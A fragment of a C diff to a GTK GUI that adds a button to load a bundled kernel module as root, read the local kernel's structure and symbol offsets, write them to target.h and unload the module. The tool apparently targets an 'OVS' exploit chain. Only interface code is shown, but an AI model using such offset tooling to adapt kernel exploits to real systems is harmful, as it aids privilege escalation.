         gtk_grid_attach(GTK_GRID(grid), hb, 2, 4, 1, 1);
+    }
+
+    /*
+     * root 获取偏移表 (仅 OVS 链): 没有 BTF / pahole / System.map 时,
+     * 用随包的内核模块 krec_dump.ko 直接读本机偏移, 读完立刻卸掉。
+     */
+    lbl = gtk_label_new("root 偏移");
+    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
+    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 5, 1, 1);
+    a->lbl_root_off = lbl;
+
+    {
+        GtkWidget *hb = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
+        GtkWidget *hint;
+
+        a->btn_root_off = gtk_button_new_with_label("root 获取偏移表");
+        gtk_widget_set_tooltip_text(a->btn_root_off,
+            "以 root 加载 tools/kmod/krec_dump.ko，直接读出本机内核的"
+            "结构体偏移和符号偏移，\n"
+            "渲染成 target.h 写进 offset/，读完立刻 rmmod。\n"
+            "适合没有 BTF / pahole / System.map 的内核；"
+            "首次会现场编模块（需要 linux-headers-$(uname -r)）。");
+        hint = gtk_label_new("加载 krec_dump.ko → 读偏移 → 写 target.h → 自动卸载");
+        gtk_widget_set_name(hint, "roothint");
+        gtk_widget_set_halign(hint, GTK_ALIGN_END);
+        gtk_widget_set_valign(hint, GTK_ALIGN_CENTER);
+        gtk_box_pack_start(GTK_BOX(hb), hint, TRUE, TRUE, 0);
+
+        gtk_box_pack_start(GTK_BOX(hb), a->btn_root_off, FALSE, FALSE, 0);
+
+        a->root_off_row = hb;
+        gtk_grid_attach(GTK_GRID(grid), hb, 1, 5, 2, 1);
     }
 
     return grid;
@@ -6885,6 +7714,7 @@ static void build_window(App *a)
     g_signal_connect(a->btn_write, "clicked", G_CALLBACK(act_write), a);
     g_signal_connect(a->btn_vmlinux, "clicked", G_CALLBACK(act_vmlinux), a);
     g_signal_connect(a->btn_pick_offset, "clicked", G_CALLBACK(act_pick_offset), a);
+    g_signal_connect(a->btn_root_off, "clicked", G_CALLBACK(act_root_offset), a);
     g_signal_connect(a->btn_stop, "clicked", G_CALLBACK(act_stop), a);
     g_signal_connect(a->btn_send, "clicked", G_CALLBACK(act_send), a);
     g_signal_connect(a->btn_ctrlc, "clicked", G_CALLBACK(act_ctrlc), a);
